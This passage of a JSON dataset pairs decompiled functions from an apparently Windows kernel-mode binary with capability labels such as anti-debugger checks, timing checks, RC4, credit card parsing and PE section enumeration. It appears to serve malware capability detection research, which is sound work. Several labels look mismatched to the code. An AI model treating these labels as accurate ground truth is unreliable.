        "decompiled_code": "\nint32_t __cdecl fcn.0005eef0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    \n    if ((arg_ch < 0x26) || (0x2d < arg_ch)) {\n        arg_ch = arg_ch - 0x1e;\n    }\n    else {\n        arg_ch = arg_ch - 0x26 | (*(arg_8h + 0x101) & 1) << 3;\n    }\n    if (*(arg_8h + 0x10b) == '\\x10') {\n        iVar1 = arg_ch + 0x15;\n    }\n    else if ((*(arg_8h + 0x8c) == ' ') ||\n            (((*(arg_8h + 0x10b) == ' ' && ((*(arg_8h + 0x101) & 0xf) >> 3 == 0)) && (*(arg_8h + 0x10a) == '\\0')))) {\n        iVar1 = arg_ch + 0x25;\n    }\n    else {\n        iVar1 = arg_ch + 0x35;\n    }\n    return iVar1;\n}\n",
        "token_count": 262
    },
    "000675d0": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000675d0(int32_t arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    if ((arg_14h & 1) == 0) {\n        fcn.00034a10(arg_8h + 0x18);\n    }\n    else {\n        iVar1 = fcn.00034a30(arg_8h + 0x18);\n        if (iVar1 == 0) {\n            return 0x21590002;\n        }\n    }\n    uVar2 = fcn.00067690(arg_8h, arg_ch, arg_10h, 0, 0, 0, 0);\n    fcn.00034a80(arg_8h + 0x18);\n    return uVar2;\n}\n",
        "token_count": 203
    },
    "0002e3b0": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002e3b0(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint var_30h;\n    uint *var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    *arg_14h = 3;\n    var_14h = fcn.000298c0(1, 0);\n    var_20h = 5;\n    var_1ch = 2;\n    var_28h = 0;\n    var_24h = 0;\n    var_2ch = &var_14h;\n    var_30h = 4;\n    var_18h = &var_30h;\n    var_10h = 1;\n    var_ch = &var_20h;\n    var_8h = 1;\n    var_4h = &var_18h;\n    fcn.0002f2c0(&var_10h, arg_18h, arg_1ch);\n    return;\n}\n",
        "token_count": 306
    },
    "0002b730": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0002b730(int32_t arg_8h, char *arg_ch)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t arg_10h;\n    uint *arg_ch_00;\n    uint var_10ch;\n    uint var_108h;\n    \n    if ((((*arg_ch == '\\\\') && (arg_ch[1] == '\\\\')) && (arg_ch[2] == '.')) && (arg_ch[3] == '\\\\')) {\n        fcn.0002c4c0(&var_108h, 0x104, 0x80054628, arg_ch + 4);\n    }\n    else if (((*arg_ch == '\\\\') && (arg_ch[1] == '?')) && ((arg_ch[2] == '?' && (arg_ch[3] == '\\\\')))) {\n        fcn.0002c4c0(&var_108h, 0x104, 0x80054630, arg_ch);\n    }\n    else {\n        fcn.0002c4c0(&var_108h, 0x104, 0x80054628, arg_ch);\n    }\n    *(arg_8h + 0x118) = 1;\n    arg_10h = arg_8h + 4;\n    arg_ch_00 = &var_108h;\n    uVar1 = fcn.0001d840();\n    uVar1 = fcn.0005d780(uVar1, arg_ch_00, arg_10h);\n    uVar2 = fcn.0001d840();\n    *(arg_8h + 0x11c) = uVar2;\n    return uVar1;\n}\n",
        "token_count": 374
    },
    "00072e80": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Heritage AFTER dead removal. Example location: s0xfffffff1 : 0x00072eb6\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00072e80(uint noname_0, uint32_t *arg_ch, uint32_t arg_10h, code *arg_14h, uint arg_18h)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    if (3 < arg_10h) {\n        var_ch = *arg_ch;\n        fcn.00072270(&var_ch);\n        if ((var_ch & 0x4000) == 0) {\n    // WARNING: Ignoring partial resolution of indirect\n            var_ch._1_1_ = 0x20;\n            fcn.00072270(&var_ch);\n            iVar2 = fcn.00078a6e();\n            for (var_4h = 0; var_4h < iVar2 % 5; var_4h = var_4h + 1) {\n                uVar1 = fcn.00078a6e();\n                *(&var_ch + var_4h + 3) = uVar1;\n            }\n            (*arg_14h)(arg_18h, &var_ch, iVar2 % 5 + 4);\n        }\n    }\n    return;\n}\n",
        "token_count": 337
    },
    "00050780": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00050780(int16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int16_t *var_4h;\n    \n    var_4h = arg_8h;\n    uVar1 = fcn.00036400(arg_8h, &var_4h, 10);\n    if (*var_4h == 0x2e) {\n        var_4h = var_4h + 1;\n        uVar3 = fcn.00036400(var_4h, &var_4h, 10);\n        if (*var_4h == 0x2e) {\n            var_4h = var_4h + 1;\n            uVar4 = fcn.00036400(var_4h, &var_4h, 10);\n            if (*var_4h == 0x2e) {\n                var_4h = var_4h + 1;\n                uVar5 = fcn.00036400(var_4h, 0, 10);\n                if ((((uVar1 < 0x100) && (uVar3 < 0x100)) && (uVar4 < 0x100)) && (uVar5 < 0x100)) {\n                    *arg_ch = uVar3 << 8 | uVar1 | uVar4 << 0x10 | uVar5 << 0x18;\n                    uVar2 = 1;\n                }\n                else {\n                    uVar2 = 0;\n                }\n            }\n            else {\n                uVar2 = 0;\n            }\n        }\n        else {\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 452
    },
    "00060ee0": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00060ee0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00060d60(arg_8h);\n    uVar2 = fcn.00060d60(arg_8h);\n    uVar3 = fcn.00060d60(arg_8h);\n    iVar4 = fcn.00060d60(arg_8h);\n    return iVar4 << 0x18 | (uVar3 & 0xff) << 0x10 | (uVar2 & 0xff) << 8 | uVar1 & 0xff;\n}\n",
        "token_count": 180
    },
    "00060ea0": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nushort __cdecl fcn.00060ea0(uint arg_8h)\n\n{\n    uchar uVar1;\n    uchar uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00060d60(arg_8h);\n    uVar2 = fcn.00060d60(arg_8h);\n    return CONCAT11(uVar2, uVar1);\n}\n",
        "token_count": 92
    },
    "00052850": {
        "rules": [
            "PEB access/35f28d23090149119036cdb16976bf66"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00052850(uint noname_0, int32_t arg_ch, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    *(arg_ch + 0x5c) = arg_10h;\n    fcn.00034570(arg_ch + 0x60);\n    return;\n}\n",
        "token_count": 73
    },
    "000178e0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000178e0(uint noname_0, uint noname_1, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_14h == 0x103) {\n        var_8h = arg_10h;\n    }\n    else {\n        var_8h = arg_14h;\n    }\n    return var_8h;\n}\n",
        "token_count": 110
    },
    "0001aaa0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0001aaa0(uint32_t arg_8h, code *arg_ch, uint arg_10h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t extraout_ECX;\n    uint var_3dh;\n    code *var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    \n    var_3dh._0_1_ = (**0x80051000)();\n    uVar1 = fcn.0001a8b0();\n    if (arg_8h == uVar1) {\n        var_24h = (*arg_ch)(arg_10h);\n    }\n    else {\n        (**0x800510d0)(&var_3dh + 1, 0, 0);\n        var_2ch = arg_ch;\n        var_28h = arg_10h;\n        (**0x800510d4)(&var_20h, 0x8005aa60, &var_3dh + 1);\n        (**0x800510ac)(&var_20h, 2);\n        (**0x800510b0)(&var_20h, extraout_ECX & 0xffffff00 | arg_8h & 0xff);\n        (**0x800510f4)(&var_20h, 0, 0);\n        do {\n            iVar2 = (**0x800510b8)(&var_3dh + 1);\n        } while (iVar2 == 0);\n    }\n    (**0x80051008)();\n    return (-(var_24h != 0) & 0x3fffffff) + 0xc0000001;\n}\n",
        "token_count": 392
    },
    "0001ddb0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0001ddb0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = fcn.000277f0(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n    if (iVar1 == 0x21590001) {\n        for (var_4h = 0; var_4h < 0x1c; var_4h = var_4h + 1) {\n            if (*(var_4h * 8 + -0x7ff33970) == arg_ch) {\n                iVar1 = (**(var_4h * 8 + -0x7ff3396c))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h);\n                return iVar1;\n            }\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 271
    },
    "0001fa30": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar fcn.0001fa30(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_6ch;\n    uint var_68h;\n    uint32_t var_ch;\n    uint var_5h;\n    \n    iVar1 = fcn.0005a620();\n    if (iVar1 == *(*0x800cc770 + 0x14)) {\n        var_5h._0_1_ = 0;\n    }\n    else {\n        iVar2 = fcn.00036d40(&var_68h, 0x52);\n        if ((iVar2 != 0) && (iVar2 = fcn.0001f6a0(&var_68h),  iVar2 != 0)) {\n            return 1;\n        }\n        var_5h._0_1_ = 0;\n        if (*0x800cdc57 == '\\0') {\n            var_5h._0_1_ = 0;\n        }\n        else {\n            fcn.00037640(0x800ce65c, &var_5h + 1, 0);\n            for (var_ch = 0; var_ch < *0x800ce668; var_ch = var_ch + 1) {\n                if (*(*0x800ce66c + var_ch * 8) == iVar1) {\n                    var_5h._0_1_ = 1;\n                    break;\n                }\n            }\n            fcn.00037670(0x800ce65c, &var_5h + 1, 0);\n        }\n    }\n    return var_5h;\n}\n",
        "token_count": 365
    },
    "000200b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000200b0(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    fcn.00037640(0x800ce65c, &var_4h, 1);\n    for (var_8h = 0; var_8h < *0x800ce668; var_8h = var_8h + 1) {\n        if (*(*0x800ce66c + var_8h * 8) == arg_8h) {\n            if ((arg_ch != '\\0') && (*(*0x800ce66c + 4 + var_8h * 8) == '\\0')) break;\n            for (var_ch = var_8h; iVar2 = *0x800ce66c,  var_ch < *0x800ce668 - 1; var_ch = var_ch + 1) {\n                iVar1 = *0x800ce66c + 0xc;\n                *(*0x800ce66c + var_ch * 8) = *(*0x800ce66c + 8 + var_ch * 8);\n                *(iVar2 + 4 + var_ch * 8) = *(iVar1 + var_ch * 8);\n            }\n            *0x800ce668 = *0x800ce668 - 1;\n            fcn.00035720(0x800ce66c, *0x800ce668 * 8 + 8, *0x800ce668 * 8);\n        }\n    }\n    fcn.00037670(0x800ce65c, &var_4h, 1);\n    return;\n}\n",
        "token_count": 395
    },
    "000262f0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000262f0(void)\n\n{\n    int32_t iVar1;\n    int32_t var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = fcn.000298c0(1, 0);\n    iVar1 = fcn.000238f0(var_1ch, 0, &var_14h, &var_20h);\n    if (iVar1 == 0) {\n        for (var_18h = 0; var_18h < var_14h; var_18h = var_18h + 1) {\n            if (*(var_20h + 0x30 + var_18h * 0x40) == *(var_20h + 0x2c + var_18h * 0x40)) {\n                fcn.000260a0(*(var_20h + var_18h * 0x40), *(var_20h + 4 + var_18h * 0x40), \n                             *(var_20h + 0x2c + var_18h * 0x40), *(var_20h + 0xc + var_18h * 0x40));\n            }\n            else {\n                iVar1 = fcn.00036320(0);\n                if (iVar1 - *(var_20h + 0x20 + var_18h * 0x40) < 0x93a81) {\n                    if (var_18h == var_14h - 1) break;\n                    fcn.00029dc0(5, 0, 0x215901f6, 0, *(var_20h + 0xc + var_18h * 0x40));\n                    fcn.00023a80(*(var_20h + var_18h * 0x40), *(var_20h + 8 + var_18h * 0x40), \n                                 *(var_20h + 4 + var_18h * 0x40));\n                }\n                else {\n                    fcn.00023a80(*(var_20h + var_18h * 0x40), *(var_20h + 8 + var_18h * 0x40), \n                                 *(var_20h + 4 + var_18h * 0x40));\n                    fcn.00029dc0(5, 0x21590204, 0x21590002, 0, *(var_20h + 0xc + var_18h * 0x40));\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_4h = 0;\n                    var_10h = 0x21590204;\n                    fcn.000238b0(0xffffffff, 1, *(var_20h + 0xc + var_18h * 0x40), 0, 0, var_20h + 0x10 + var_18h * 0x40\n                                );\n                }\n            }\n        }\n        fcn.00023b90(var_20h);\n    }\n    return;\n}\n",
        "token_count": 733
    },
    "00029dc0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00029dc0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_14h = arg_8h;\n    var_10h = arg_ch;\n    var_ch = arg_10h;\n    var_8h = arg_14h;\n    var_4h = fcn.000238b0(0xfffffffe, 4, arg_18h, 0, 0, &var_14h);\n    if (var_4h == 4) {\n        iVar1 = fcn.000298c0(2, 0);\n        fcn.00028a60(0xfffffffe, 4, iVar1 + 1);\n        fcn.000238b0(0xfffffffe, 4, arg_18h, 0, 0, &var_14h);\n    }\n    return;\n}\n",
        "token_count": 258
    },
    "00033c70": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00033c70(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    uint32_t var_90h;\n    uint var_8ch;\n    uint var_88h;\n    \n    if ((arg_10h % 0x200 == 0) && (arg_10h <= *(arg_8h * 8 + -0x7ff31950) - 0x200U)) {\n        fcn.000317c0(&var_88h, 0x10, 0x800cbb50);\n        var_8ch = *0x800cbb54;\n        var_90h = *0x800cbb50 & 0xffffff00 | arg_10h >> 9 & 0xff;\n        fcn.00030ca0(arg_ch, *(arg_8h * 4 + -0x7ff31958) + arg_10h, 0x200, &var_88h, &var_90h, 1);\n        uVar1 = 1;\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 266
    },
    "00033d20": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00033d20(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint uVar1;\n    uint32_t var_99h;\n    uint var_94h;\n    uint var_90h;\n    int32_t var_4h;\n    \n    if ((arg_10h % 0x200 == 0) && (arg_10h <= *(arg_8h * 8 + -0x7ff31950) - 0x200U)) {\n        var_99h._0_1_ = '\\x01';\n        for (var_4h = 0; var_4h < 0x200; var_4h = var_4h + 1) {\n            if (*(*(arg_8h * 4 + -0x7ff31958) + arg_10h + var_4h) != '\\0') {\n                var_99h._0_1_ = '\\0';\n                break;\n            }\n        }\n        if (var_99h == '\\0') {\n            fcn.000317c0(&var_90h, 0x10, 0x800cbb50);\n            var_94h = *0x800cbb54;\n            stack0xffffff64 = *0x800cbb50 & 0xffffff00 | arg_10h >> 9 & 0xff;\n            fcn.00030ca0(*(arg_8h * 4 + -0x7ff31958) + arg_10h, arg_ch, 0x200, &var_90h, &var_99h + 1, 0);\n            uVar1 = 1;\n        }\n        else {\n            fcn.00078bfa(arg_ch, 0, 0x200);\n            uVar1 = 1;\n        }\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 441
    },
    "00037dc0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00037dc0(uint8_t *arg_8h)\n\n{\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    var_8h = 0;\n    while( true ) {\n        if (7 < var_8h) {\n            if ((*arg_8h == var_1h / 0x1a + 0x41) && (arg_8h[1] == 0x7a - var_1h % 0x1a)) {\n                var_ch = 1;\n            }\n            else {\n                var_ch = 0;\n            }\n            return var_ch;\n        }\n        if ((((*arg_8h < 0x41) || (0x5a < *arg_8h)) && ((*arg_8h < 0x61 || (0x7a < *arg_8h)))) &&\n           ((*arg_8h < 0x30 || (0x39 < *arg_8h)))) break;\n        var_1h._0_1_ = var_1h + *arg_8h;\n        var_8h = var_8h + 1;\n        arg_8h = arg_8h + 1;\n    }\n    return 0;\n}\n",
        "token_count": 324
    },
    "00037ea0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00037ea0(uint8_t *arg_8h)\n\n{\n    uint var_10h;\n    uint8_t var_9h;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    var_8h = 0;\n    while( true ) {\n        if (7 < var_8h) {\n            if ((*arg_8h == var_1h / 0x1a + 0x61) && (arg_8h[1] == 0x7a - var_1h % 0x1a)) {\n                var_10h = 1;\n            }\n            else {\n                var_10h = 0;\n            }\n            return var_10h;\n        }\n        var_9h = *arg_8h;\n        if ((0x40 < var_9h) && (var_9h < 0x5b)) {\n            var_9h = var_9h + 0x20;\n        }\n        if ((var_9h < 0x61) || (0x7a < var_9h)) break;\n        var_1h._0_1_ = var_1h + var_9h;\n        var_8h = var_8h + 1;\n        arg_8h = arg_8h + 1;\n    }\n    return 0;\n}\n",
        "token_count": 346
    },
    "000463b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.000463b0(uint32_t **arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = *arg_8h;\n    puVar2 = arg_8h[1];\n    *puVar2 = puVar1;\n    puVar1[1] = puVar2;\n    return puVar1 & 0xffffff00 | puVar1 == puVar2;\n}\n",
        "token_count": 121
    },
    "00047090": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00047090(int32_t arg_8h, int32_t arg_ch, uchar *arg_10h)\n\n{\n    char *pcVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_8h = 0;\n    *arg_10h = 1;\n    if ((((arg_8h == *0x800ce944) && (pcVar1 = *(arg_ch + 0x60),  *pcVar1 == '\\x0e')) && (*(pcVar1 + 4) == 0x3c)) &&\n       ((*(pcVar1 + 0xc) == 0x12001b || (*(pcVar1 + 0xc) == 0x12000f)))) {\n        var_4h = 0x80087120;\n        var_8h = (**0x800511c0)();\n        (**0x800512e4)();\n    }\n    fcn.00016240(arg_8h, arg_ch, var_4h, var_8h);\n    return;\n}\n",
        "token_count": 249
    },
    "00052c90": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00052c90(int32_t arg_8h, uint *arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (arg_10h == 0xe) {\n        var_ch = arg_ch;\n        iVar1 = *(arg_ch + 3);\n        iVar2 = fcn.00035980(0x7ff);\n        if (iVar1 == iVar2) {\n            var_1ch = *var_ch;\n            var_18h = var_ch[1];\n            var_14h = var_ch[2];\n            var_10h._0_2_ = *(var_ch + 3);\n            var_10h._0_2_ = fcn.00035980(0x800);\n            var_8h = arg_8h;\n            var_4h = *(arg_8h + 8);\n            fcn.00048310(var_4h, 0, &var_1ch, 0xe, arg_14h, arg_18h, 0);\n            return;\n        }\n    }\n    fcn.00057380(arg_ch, arg_10h, arg_14h, arg_18h, 0);\n    return;\n}\n",
        "token_count": 352
    },
    "00053510": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x0005354e\n\nuint __cdecl fcn.00053510(uint arg_8h, int32_t arg_ch, uchar *arg_10h)\n\n{\n    uint uVar1;\n    uint var_18h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_10h = 1;\n    if (0x12 < **(arg_ch + 0x60)) {\n        uVar1 = fcn.00016240(arg_8h, arg_ch, 0, 0);\n        return uVar1;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 179
    },
    "0005bdc0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0005bdc0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    arg_8h = arg_8h + *(arg_8h + 0x3c);\n    if (*(arg_8h + 0x18) == 0x10b) {\n        var_4h = *(arg_8h + 0x38);\n        var_18h = *(arg_8h + 0x54);\n        var_1ch = *(arg_8h + 0x50);\n    }\n    else {\n        var_4h = *(arg_8h + 0x38);\n        var_18h = *(arg_8h + 0x54);\n        var_1ch = *(arg_8h + 0x50);\n    }\n    var_18h = fcn.0005b750(var_18h, var_4h);\n    var_ch = arg_8h + 0x18 + *(arg_8h + 0x14);\n    for (var_8h = 0; var_8h < *(arg_8h + 6); var_8h = var_8h + 1) {\n        iVar1 = fcn.0005b750(*(var_ch + 8), var_4h);\n        var_18h = iVar1 + var_18h;\n        var_ch = var_ch + 0x28;\n    }\n    if (var_18h < var_1ch) {\n        var_20h = var_1ch;\n    }\n    else {\n        var_20h = var_18h;\n    }\n    return var_20h;\n}\n",
        "token_count": 437
    },
    "0005e7e0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x0005e86f\n// WARNING: Switch with 1 destination removed at 0x0005e896\n// WARNING: Switch with 1 destination removed at 0x0005e97a\n// WARNING: Switch with 1 destination removed at 0x0005e9a4\n\nuint __cdecl fcn.0005e7e0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(arg_8h + 0x10b) == ' ') {\n        iVar1 = *(arg_8h + 0x9c);\n        if (iVar1 < 0xd5) {\n            if (iVar1 == 0xd4) {\n                return 0xd3;\n            }\n            if (iVar1 == 0x19) {\n                return 0x5a;\n            }\n            if (iVar1 == 0x39) {\n                return 0x36;\n            }\n            if (iVar1 == 0x59) {\n                return 0x5b;\n            }\n        }\n        else if (iVar1 < 0x188) {\n            if (iVar1 == 0x187) {\n                return 0x188;\n            }\n            if (iVar1 - 0xd9U < 0xad) {\n                return;\n            }\n        }\n        else if (iVar1 - 0x1aeU < 0x47) {\n            return;\n        }\n    }\n    if (*(arg_8h + 0x10b) == '@') {\n        iVar1 = *(arg_8h + 0x9c);\n        if (iVar1 < 0x104) {\n            if (iVar1 == 0x103) {\n                return 0x102;\n            }\n            if (iVar1 - 0x19U < 0xc1) {\n                return;\n            }\n        }\n        else if (iVar1 - 0x135U < 0xc0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    if ((*(arg_8h + 0x10c) == ' ') && (*(arg_8h + 0x9c) == 0xdc)) {\n        uVar2 = 0xdd;\n    }\n    else if ((*(arg_8h + 0x10c) == '@') && (*(arg_8h + 0x9c) == 0xdc)) {\n        uVar2 = 0xdf;\n    }\n    else {\n        uVar2 = *(arg_8h + 0x9c);\n    }\n    return uVar2;\n}\n",
        "token_count": 627
    },
    "0005ef90": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0005ef90(int32_t arg_8h, int32_t arg_ch)\n\n{\n    if (*(arg_8h + 0x10b) == '\\x10') {\n        arg_ch = arg_ch + -0x19;\n    }\n    else {\n        arg_ch = arg_ch + -9;\n    }\n    return arg_ch;\n}\n",
        "token_count": 83
    },
    "0005efc0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x0005efdc\n\nuint __cdecl fcn.0005efc0(uint noname_0, int32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    if (4 < arg_ch - 2U) {\n        return 0;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 101
    },
    "0005f040": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Switch with 1 destination removed at 0x0005f083\n\nvoid __cdecl fcn.0005f040(uint arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    uchar uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.0005e710(arg_8h, arg_ch);\n    *(arg_10h + 1) = uVar1;\n    *arg_10h = 0x8f;\n    if (0x38 < *(arg_10h + 1) - 8) {\n        return;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    halt_baddata();\n}\n",
        "token_count": 165
    },
    "0005f7e0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
